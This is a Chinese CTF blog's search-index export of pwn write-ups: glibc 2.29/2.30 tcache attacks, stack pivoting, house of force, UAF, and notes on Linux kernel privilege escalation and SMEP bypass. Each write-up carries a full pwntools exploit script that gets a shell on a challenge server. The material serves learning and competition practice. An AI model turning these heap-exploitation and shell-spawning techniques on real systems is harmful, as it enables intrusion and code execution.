<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[高校战"疫"ctf twochunk解析]]></title>
    <url>%2F2020%2F03%2F10%2Fgxzyctf2020-twochunk%2F</url>
    <content type="text"><![CDATA[这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目，一个小突破吧。 队伍的全部wp：http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcgePS：今天看到出题的t1an5t师傅将这种利用方法叫做tcache stash unlink attack plus 漏洞分析直接看源码吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* If a small request, check regular bin. Since these "smallbins" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif 这段代码在glibc2.30版本_int_malloc()函数中，从smallbins中申请出chunk时的一系列操作，我们分解来看：首先是对该chunk进行完整性检测： 12if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); 然后进行unlink 123set_inuse_bit_at_offset (victim, nb);bin-&gt;bk = bck;bck-&gt;fd = bin; 接下来，根据注释可以得知，如果还存在相同字节大小的不同chunk，会将其存放进tcache。 123456789101112131415/* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; 整个过程是先将chunk从smallbins链中摘除再将其放入tcache，但对即将存放入tcache的chunk并没有进行完整性检测(bck-&gt;fd != victim)，这样就给了伪造chunk-&gt;bk的条件 利用以上可以做两件事 1.将fake chunk放入tcache中2.可以在fake chunk-&gt;fd中写入一个地址，这个地址通常是main_arena偏移的地址 利用过程构造在smallbins中有两个chunk:修改后面进入的chunk-&gt;bk为fake chunk：接下来我们申请出一个chunk，再次查看：大功告成！ 注意几点： 1.如果想把chunk放入tcache的同时，还要写入一个地址在fake chunk-&gt;fd中，不仅要提前设置好chunk-&gt;fd，还有chunk-&gt;bk，因为在unlink过程会访问bk（bin-&gt;bk = bck;)，如果是非法地址会导致程序crash。2.设置好tcache剩余chunk的数量 题解对于这道题来讲，我们可以合理的利用这两个点来搞事情了，首先我们要先构造有两个chunk在smallbins里，而且大小要为0x90,办法有很多，我简单说一下我的思路 1.利用calloc不会从tcache中申请，这样我们可以先将tcache填满再calloc申请chunk然后free掉，不会浪费我们仅有的两个位置2.释放进入tcache的chunk不会与top chunk或其他bins合并3.要先leak堆地址用来当写入chunk-&gt;bk时，恢复chunk-&gt;fd4.malloc出来的chunk大小为0xe9却可以输入23333字节，导致堆溢出来修改free chunk-&gt;bk 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *context.log_level = &apos;debug&apos;prog = &apos;./twochunk&apos;#p = process(prog)libc = ELF(&quot;../libc-2.30.so&quot;)p = remote(&quot;121.36.209.145&quot;, 9999) def add(idx, size): p.sendlineafter(&quot;choice: &quot;, &apos;1&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx)) p.sendlineafter(&quot;size: &quot;, str(size))def edit(idx, content): p.sendlineafter(&quot;choice: &quot;, &apos;4&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx)) p.sendafter(&quot;content: &quot;, content)def free(idx): p.sendlineafter(&quot;choice: &quot;, &apos;2&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx))def show(idx): p.sendlineafter(&quot;choice: &quot;, &apos;3&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx))def showmsg(): p.sendlineafter(&quot;choice: &quot;, &apos;5&apos;)def malloc(content): p.sendlineafter(&quot;choice: &quot;, &apos;6&apos;) p.sendafter(&quot;message: &quot;, content)def hack(): p.sendlineafter(&quot;choice: &quot;, &apos;7&apos;)def exp(): p.sendafter(&quot;leave your name: &quot;, p64(0x23333030-0x10)*6) p.sendlineafter(&quot;message: &quot;, p64(0x23333000)*6) for i in range(6): add(0, 0xe9) free(0) for i in range(5): add(0, 0x88) free(0) for i in range(7): add(0, 0x130) free(0) add(0, 0xe9) add(1, 0x130) free(0) add(0, 0x100) free(0) add(0, 0x130) free(1) add(1, 0x140) free(1) add(1, 0xe9) free(0) free(1) add(0, 0xa8) add(1, 0xa8) free(1) free(0) add(1, 0x150) add(0, 23333) show(0) heap = u64(p.recv(6)+&apos;\x00&apos;*2) log.info(&quot;heap ==&gt;&quot; + hex(heap)) edit(0, &apos;a&apos;*416+p64(0)+p64(0x91)+p64(heap+0x1080)+p64(0x23333000-0x10)) free(1) add(1, 0x88) showmsg() p.recv(0x15) libc.address = u64(p.recvuntil(&apos;\x7f&apos;)[-6:]+&apos;\x00&apos;*2)-0x00007f7b2def2c60+0x7f7b2dd08000 log.info(&quot;libc.address ==&gt;&quot; + hex(libc.address)) payload = p64(libc.sym[&apos;system&apos;])+&apos;\x00&apos;*0x28+p64(0x23333048)+p64(0)+p64(0)+&apos;/bin/sh\x00&apos; malloc(payload) hack() p.interactive()if __name__ == &apos;__main__&apos;: exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020CTF公益赛以及针对libc2.29的一些研究]]></title>
    <url>%2F2020%2F02%2F24%2Fgyctf-2020%2F</url>
    <content type="text"><![CDATA[主要总结了libc-2.29的一些新的机制和利用办法。 document题目没给libc文件，通过对远程靶机连续free两个相同chunk，发现在tcache中报错double free，猜测远程为libc-2.29。这道题主要针对的是libc-2.29的一些新的特性，先看一下源码： 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 在tcache_entry中新加入了一个指针key，位于chunk-&gt;bk 12345678910111213tcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as "in the tcache" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 当chunk被释放进入tcache时调用tcache_put()，在libc-2.29版本中会将chunk-&gt;key指向tcache头。 123456789101112131415161718192021222324252627282930313233#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr ("free(): double free detected in tcache 2"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125; &#125;#endif 在tcache中新添加一条检测，当被释放的chunk-&gt;key为tcache时会遍历tcache链表，如果找到相同chunk会报错double free，这个检测看起来比fastbins还凶残，因为fastbins只会检测链表头部，不过若是仔细思考如果我们能够更改掉key，也就是chunk-&gt;bk，那么这条检测就很好pass掉了。猜测这道题目出题人就是为了这个考点特意加上一个更改sex的功能（sex位于chunk-&gt;bk），加上我们可以利用free后未将指针清零，进行double free完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *prog = './pwn'p = process(prog)libc = ELF("/home/luckyu/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so")#p = remote("123.56.85.29", 4807)def dbg(b= ''): gdb.attach(p, b) if b == '': p.interactive() def add(name='a'*8, content= 'a'*0x70): p.sendlineafter("choice : \n", '1') p.sendafter("name\n", name) p.sendafter("sex\n", 'W') p.sendafter("information\n", content.ljust(0x70, '\x00'))def show(idx): p.sendlineafter("choice : \n", '2') p.sendlineafter("index : \n", str(idx))def edit(idx, content='\x00'): p.sendlineafter("choice : \n", '3') p.sendlineafter("index : \n", str(idx)) p.sendlineafter("sex?", 'Y') p.sendafter("information\n", content.ljust(0x70, '\x00'))def free(idx): p.sendlineafter("choice : \n", '4') p.sendlineafter("index : \n", str(idx))def exp(): add()#0 add()#1 free(0) free(1) show(1) heap = u64(p.recv(6)+'\x00'*2)-0x270 log.info("heap =" + hex(heap)) edit(1) free(1) add(p64(heap), 'a')#2 add()#3 add('a'*8, '\xff'*0x10)#4 free(3) show(3) libc.address = u64(p.recv(6)+'\x00'*2)-0x7f220c6b7ca0+0x7f220c4d3000 log.info("libc.address ==&gt; " + hex(libc.address)) edit(4,'\x00'*0x10+p64(libc.sym['__free_hook'])*12) add(p64(libc.sym['system']), 'a')#5 add('/bin/sh\x00', 'a')#6 free(6) #dbg() p.interactive()if __name__ == '__main__': exp() signin这道题可以和document拿到一起看，同样是libc-2.29，先看一段源码： 123456789101112131415/* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125;&#125; 这段代码出现在malloc.c在处理fastbins中，结合注释我们可以看到，在fastbins取下一个chunk后，如果fastbins未空且tcache未满，会调用tcache_put()将剩余chunk加入到tcache中，结合我们之前对tcache_put()这个函数的了解，会在chunk-&gt;bk的位置写入一个key，利用这点，我们就足以pass掉程序的限制getshell，但是如何在还有众多tcache之中去从fastbins申请到chunk呢，观察到在执行system(“/bin/sh”)前，程序执行了calloc函数，不禁发问缘由，通过查找发现calloc并不会从tcache中申请chunk，那么我们就可以愉快的从fastbins中申请了。exp: 12345678910111213141516171819202122232425262728from pwn import *context.log_level = 'debug'prog = './pwn'p = process(prog)#p = remote("123.56.85.29",4205) def add(idx): p.sendlineafter("choice?", '1') p.sendlineafter("idx?\n", str(idx))def edit(idx, content): p.sendlineafter("choice?", '2') p.sendlineafter("idx?\n", str(idx)) p.send(content)def free(idx): p.sendlineafter("choice?", '3') p.sendlineafter("idx?\n", str(idx))def exp(): for i in range(9): add(i) for i in range(9): free(i) edit(8, p64(0x4040a8)) add(0) p.sendlineafter("choice?", '6') dbg() p.interactive()if __name__ == '__main__': exp() 等等，这道题还没有结束，其实还有一个更简单的利用办法，我们再来看一段源码： 12345678910tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 有put就有get，当从tcache中申请chunk后，tcache_get()会将chunk-&gt;key清零，这道题其实可以间接利用的这个特性，将控制edit使用次数的cnt清零，我们就可以再利用一次edit，这样就可以直接写数据到ptr了。 12345678def exp(): add(0) free(0) edit(0, p64(0x4040bc-8)) add(0) add(0) edit(0, 'a'*13) p.sendlineafter("choice?", '6') borrowstack一道栈迁移到bss段执行的题目，比较中规中矩，注意在迁移位置前留一段合法访问空间即可，因为在函数调用过程可能会访问到前面的空间。exp: 123456789101112131415161718192021222324from pwn import * #p = process("./borrowstack")p = remote("123.56.85.29", 3635)elf = ELF("./borrowstack")libc = ELF("../libc-2.23.so")lev_ret = 0x400699bss = 0x601080read = 0x400680pop_rdi = 0x400703pop_rsi_r15=0x400701#gdb.attach(p, 'b*0x400699')payload = 'a'*0x60+p64(bss+0x40)+p64(lev_ret)#p64(0x400660)p.sendafter("\n", payload)rop1 = p64(bss)*0x9+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss)+p64(bss+0x60)+p64(elf.plt['read'])p.sendafter("\n", rop1)puts_addr = u64(p.recv(6)+'\x00'*2)log.info("puts_addr==&gt; " + hex(puts_addr))libc.address = puts_addr - libc.sym['puts']#sleep(0.1)rop2 = 'a'*(0x118-0x88)+p64(libc.address+0x4526a)#p64(pop_rdi)+'/bin/sh\x00'+p64(libc.sym['system'])p.sendline(rop2)p.interactive() force看名识题，程序中只有add()，没限定申请的size,且有明显的堆溢出，故采用house of forceexp: 12345678910111213141516171819202122232425262728293031323334353637from pwn import *#p = process("./pwn1")p = remote("node3.buuoj.cn", 25014)libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def dbg(): gdb.attach(p) p.interactive()def add(size, content): p.sendline("1") p.sendlineafter("size\n", str(size)) p.sendafter("content\n", content)def exp(): p.sendline("1") p.sendlineafter("size\n", str(0x200000)) p.recvuntil("0x") libc.address = int(p.recv(12), 16)-0x7f9bdf4f5010+0x7f9bdf6f6000 p.sendafter("content\n", 'aa') log.info("libc.address == &gt;" + hex(libc.address)) p.sendline("1") p.sendlineafter("size\n", str(0x18)) p.recvuntil("0x") heap = int(p.recv(12), 16) p.sendafter("content\n", 'a'*0x18+'\xff'*8) log.info("heap="+hex(heap)) offset = libc.sym['__malloc_hook'] -heap- 0x40 log.info("offset = " + str(offset)) add(offset, 'a') add(0x18, '\x00'*8+p64(libc.address+0x4526a)+p64(libc.sym['__libc_realloc']+4)) p.recvuntil("puts\n") p.sendline(str(1)) p.recvuntil("size\n") # pause() p.sendline(str(0)) p.interactive() if __name__ == '__main__': exp() Some_thing_exceting题目漏洞很简单，利用UAF就可以泄露存在堆中的flag，但是在本地调试过程中由于程序使用open(“/flag”)，无法打开本地文件(open返回值是0)，我选择了用IDA patch源文件将其改为open(“flag”)exp: 123456789101112131415161718192021222324252627from pwn import *prog = &apos;./excited&apos;#p = process(prog)p = remote(&quot;123.56.85.29&quot;, 6484) def add(size1, content1, size2, content2): p.sendlineafter(&quot;do :&quot;, &apos;1&apos;) p.sendlineafter(&quot;ba&apos;s length : &quot;, str(size1)) p.sendafter(&quot;ba : &quot;, content1) p.sendlineafter(&quot;na&apos;s length : &quot;, str(size2)) p.sendafter(&quot;na : &quot;, content2)def show(idx): p.sendlineafter(&quot;do :&quot;, &apos;4&apos;) p.sendlineafter(&quot;ID : &quot;, str(idx))def free(idx): p.sendlineafter(&quot;do :&quot;, &apos;3&apos;) p.sendlineafter(&quot;ID : &quot;, str(idx))def exp(): add(0x20, &apos;aaa&apos;, 0x20, &apos;bbb&apos;)#0 add(0x20, &apos;aaa&apos;, 0x20, &apos;bbb&apos;)#1 free(0) free(1) add(0x10, p64(0x6020a8), 0x20, &apos;bbb&apos;) show(0) p.interactive()if __name__ == &apos;__main__&apos;: exp() Some_thing_interesting其实这道题有一个格式化字符串漏洞在开头，比赛时候审题不严谨没有看到（TCL！），我是利用uaf，并通过一些堆块的摆放，制造heap overlap修改heap size为0x90然后释放，从而leak libc，然后再次利用uaf修malloc_hook从而执行one_gadgetexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = 'debug'prog = './interested'elf = ELF(prog)#p = process(prog)#,env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)libc = ELF("../libc-2.23.so")p = remote("123.56.85.29", 3041)def dbg(b= ''): gdb.attach(p, b) if b == '': p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def add(size1, content1, size2, content2): p.sendlineafter("do :", '1') p.sendlineafter("length : ", str(size1)) p.sendafter(": ", content1) p.sendlineafter("length : ", str(size2)) p.sendafter(": ", content2)def edit(idx, content1, content2): p.sendlineafter("do :", '2') p.sendlineafter("ID : ", str(idx)) p.sendafter(": ", content1) p.sendafter(": ", content2)def show(idx): p.sendlineafter("do :", '4') p.sendlineafter("ID : ", str(idx))def free(idx): p.sendlineafter("do :", '3') p.sendlineafter("ID : ", str(idx))def exp(): passwd = 'OreOOrereOOreO'.ljust(0x13, 'a') p.sendafter(':', passwd) add(0x60, (p64(0)+p64(0x71))*3, 0x60, (p64(0)+p64(0x71))*3)#1 free(1) edit(1, '\x20', '\x20') add(0x60, (p64(0)+p64(0x91))*3, 0x60, (p64(0)+p64(0x91))*3)#2 edit(1, (p64(0)+p64(0x91))*3, (p64(0)+p64(0x31))*4) free(2) show(2) libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x7f7c98860b78+0x7f7c9849c000 edit(1, p64(libc.sym['__malloc_hook']-0x23), p64(libc.sym['__malloc_hook']-0x23)) log.info("libc.address ==&gt; " + hex(libc.address)) payload = '\x00'*0x13+p64(libc.address+0xf1147) add(0x60, payload, 0x60, payload) #dbg() p.interactive()if __name__ == '__main__': exp() 吃鸡游戏唯二做出的逆向题，另一个用的原始人办法，略蠢就不提了。这是一个QT编写的程序，在网上查到一个QT按钮的特征码，OD中二进制查找，单步调式会找到cmp函数，rax寄存器就是对应的密码]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux kernel学习（一）]]></title>
    <url>%2F2020%2F02%2F14%2Flinux-kernel-1%2F</url>
    <content type="text"><![CDATA[最近学习了一些linux kernel的基础知识和几个漏洞的利用办法 进程相关 进程是处于执行期的程序以及相关的资源的总称，是操作系统资源分配的单位。进程的资源包括：1.打开的文件2.挂起的信号3.内核的内部数据4.处理器的状态5.内存映射的内存地址空间 等等 Linux内核通过一个被称为进程描述符的task_struct结构体来管理进程，这个结构体包含了一个进程所需的所有信息。它定义在include/linux/sched.h文件中可以在https://code.woboq.org/linux/linux/include/linux/sched.h.html#task_struct中查看进程的权限是用cred结构体记录的，经常会利用这个结构体来进行提权 1234567891011struct task_struct &#123; /* ... *//* Process credentials: */ /* Tracer's credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; /* ... */&#125;; cred结构体定义如下： 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we&apos;re permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125; __randomize_layout; 其中包含了进程的权限（uid,gid,suid）等信息，如果我们能够修改cred结构体，就修改了这个进程的权限 内核对象缓冲区管理内核对某些对象（如 task_struct）的使用是非常频繁的，所以用户进程堆管理常用的基于搜索的分配算法比如First-Fit（在堆中搜索到的第一个满足请求的内存块）和 Best-Fit（使用堆中满足请求的最合适的内存块）并不直接适用，而应该采用某种缓冲区的机制。现在频繁使用的是linux kernel 2.6.22版本引入的slub的内核对象缓冲区分配器，它逐渐取代了以前的slab分配器。利用slub的分配方式我们可以进行类似于heap uaf的相关利用 漏洞保护机制KASLR类似于ASLR，是内核地址空间随机化，KASLR技术可以让kernel image映射的地址相对于链接地址有个偏移kaslr的主要流程可以分为以下几步： 1.在一个随机的物理地址加载内核 映射内核在vmalloc域的一个随机虚拟地址 映射一些变量以及符号表，偏移地址和image一样 内核地址显示限制通常情况下我们可以利用cat /proc/kallsyms来获得内核相关函数地址，如commit_creds:而Linux kernel可以利用kptr_restrict的值来指示是否限制通过/proc和其他接口暴露内核地址，其数值代表： 0：默认情况下，没有任何限制。1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权2：使用％pK打印的内核指针将被替换为0而不管特权。 当限制查看内核地址时，其地址会显示为0：要禁用该限制可以使用下面命令:sudo sysctl -w kernel.kptr_restrict=0PS:同样的值还有dmesg_restrict,如果我们将其设置为1，就不能通过demsg查看kernel信息了 smep/smap这部分信息和绕过办法在ctf-wiki上有详细说明smep全称是Supervisor Mode Execution Protection，管理模式执行保护其作用是保护内核使其不允许执行用户空间代码，开启smep之后，当CPU处于ring0模式时，执行用户空间的代码会触发页错误。检查smep是否开启：cat /proc/cpuinfo | grep smepsmep保护原理及绕过方法：操作系统是通过CR4寄存器的第20位的值来判断smep是否开启第20位 = 1时：smep开启第20位 = 0时：smep关闭可同通过mov指令给CR4寄存器赋值从而达到关闭smep的目的，相关的mov指令可以通过ropper，ROPgadget等工具查找（推荐使用ropper，相比之下速度更快）。 smap全称是Supervisor Mode Access Protection，管理员模式访问保护，其与smep类似，是通过CR4寄存器的第21位判断。 调试办法如果题目没有给vmlinux，我们需要从内核映像中将其提取，利用extract-vmlinux：./extract-vmlinux ./bzImage &gt; vmlinux然后修改boot.sh加入-gdb tcp:1234，重新打包即可然后启动qemu，由于调试过程我们需要在gdb中加载符号表（为了可以直接对驱动中函数下断点），先查询驱动加载地址：cat /sys/module/core/sections/.text或者cat proc/modules然后在qemu外启动gdb:gdb vmlinux -qpwndbg&gt; add-symbol-file ./babydriver.ko 0xffffffffc0000000pwndbg&gt; target remote:1234这样我们就可以愉快的调试了]]></content>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw re-alloc_revenge]]></title>
    <url>%2F2020%2F02%2F05%2Fpwnable-tw-re-alloc-revenge%2F</url>
    <content type="text"><![CDATA[一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性 分析程序程序主要有三个功能，malloc申请内存保存数据、realloc重新分配内存以及free释放内存，堆指针由一个全局数组保存，而三种操作中都限制了数组范围只有两个，且free后将数组指针清0，此外，程序还限制了申请空间的大小不大于0x78 前置知识reallocrealloc函数在头文件&lt;stdlib.h&gt;中 1void *realloc(void *ptr,size_t new_size); ptr是将要进行重新分配的内存空间指针（必须在堆中），new_size是想要分配空间的大小realloc主要特性：1.对ptr进行判断，如果ptr为NULL，则相当于malloc(new_size)2.如果ptr不为NULL，会查看ptr是否指向堆上的空间，如果不是会给出异常错误realloc invalid pointer；如果ptr在堆中，则查看new_size的大小，如果new_size为0，相当于free(ptr)，返回NULL；如果new_size小于原空间大小（后面记为old_size)，则ptr中的数据可能会丢失；如果new_size&gt;old_size，会查看ptr指向的空间后面还有没有足够大小的连续空间，如果有的话，继续分配更多的空间，如果没有则将free(ptr)，然后malloc(new_size)，并将内容拷贝到新内存；如果new_size==old_size，则相当于没做什么。以上为网上和结合本人实际应用的大概总结，不过在对于new_size&gt;old_size时其实有些模棱两可，通过这道题我的发现，如果当new_size&lt;old_size，会有可能进行free(ptr+new_size)。如图，一个old_size=0x250的空间：我们将原size为0x250的空间重新分配为0x30的空间，跟踪进入realloc，首先会改写ptr+new_size的内容，使其拥有chunk head：继续调试跟踪，发现调用了free将新的空间释放： libc-2.29在libc-2.29中加入了很多新的防护机制，主要参考自EX师傅的文章：http://blog.eonew.cn/archives/1167总结一下：1.tcache double free难以利用2.增加了对prev_size的检测，会判断prev_size与要合并的chunk的size是否相等3.unsorted bin attack难以利用4.无法进行house of force此外应该还有其他的机制，今后会继续研究 限于（咸鱼）笔者水平太差，做过的2.29版本的pwn题不是很多，遇到的主要利用办法有：1.通过多次malloc和free将同一chunk分别进入tcache和fastbins，造成“double free”2.通过修改tcache struct（tcache虽然被限制了，但是还是一个很好的利用方向）3.可以利用largebin attack代替unsortedbin attack 漏洞利用这道题主要利用了当realloc的size参数为0时可以将指针free掉，且没有将指针清0从而导致UAF，但难点在于程序环境为libc2.29且全局数组只能保存两个指针，并且程序不能申请大于0x78的空间（加大了泄露libc的难度） 泄露libc基址libc-2.29版本存在tcache首先会在heap开头位置创建一个tcache结构体来维护： 12345typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS];//0x40 tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8&#125; tcache_perthread_struct; 其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针，针对tcache结构体的利用参考：https://xz.aliyun.com/t/6828这样我们可以利用uaf申请空间到tcahce sturct（需要爆破一字节），然后将tcache的数量改为大于7的数字（由于是无符号比较，-1即可），从而使得tcache不可用，这样free后的chunk就不会进入tcache：然后再利用realloc的特性，重新分配tcache struct这部分空间，可以将多余大小的空间释放掉，使其进入unsorted bin，如果控制好重新分配空间的大小，就足以将unsorted bin链表头写入tcahce指针数组对应的位置：这样如果我们再次申请空间（注意有些size不可用）就会从unsorted bin中申请，恰好可以利用unsorted bin链表头对于libc的偏移量，爆破一字节使得tcache指针指向_IO_2_1_stdout_的位置，这样我们就可以修改其结构体内容从而泄露libc基址 getshell由于我们已经劫持了tcache struct接下来的事情就顺理成章，修改指针指向free_hook将其修改为system然后就可以执行system(“/bin/sh”)来getshell了 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'prog = './re-alloc_revenge'elf = ELF(prog)libc = ELF("libc.so")def dbg(): gdb.attach(p) #if b == '': # p.interactive()def alloc(idx, size, content='a'): p.sendlineafter("choice: ", '1') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) p.sendafter("Data:", content)def realloc(idx, size, content='a'): p.sendlineafter("choice: ", '2') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) if size != 0: p.sendafter("Data:", content)def free(idx): p.sendlineafter("choice: ", '3') p.sendlineafter("Index:", str(idx))def exp(): try: global p #p = process(prog) p = remote('chall.pwnable.tw', 10310) alloc(0, 0x40) alloc(1, 0x40) free(0) realloc(1, 0) realloc(1, 0x40 ,'\x10\x60') alloc(0, 0x40) realloc(0, 0x50) free(0) alloc(0, 0x40, '\xff'*4+'\x00'*2+'\xff'*(0x40-6)) realloc(0, 0x50) realloc(1, 0x70) free(1) alloc(1, 0x30) free(0) realloc(1, 0x30, 'a'*8+'\x58\x47') alloc(0, 0x60, '/bin/sh\x00'+p64(0xfbad1800)+p64(0)*3) p.recv(8) libc.address = u64(p.recv(6)+'\x00'*2)-0x7ffff7fc7570+0x7ffff7de0000 log.info("libc.address ==&gt; " + hex(libc.address)) if libc.address &amp; 0xff != 0: p.close() return False realloc(1, 0x30, 'a'*8+p64(libc.sym['__free_hook'])) free(1) alloc(1, 0x60, p64(libc.sym['system'])) free(0) except: p.close() return False p.interactive()if __name__ == '__main__': while not exp(): pass 总共爆破了两字节，（实际上我很快就成功了，运气不错，不知道是不是因为这两个字节有什么联系，但肯定不是一一对应）]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux kernel环境搭建]]></title>
    <url>%2F2020%2F01%2F29%2Flinux-kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
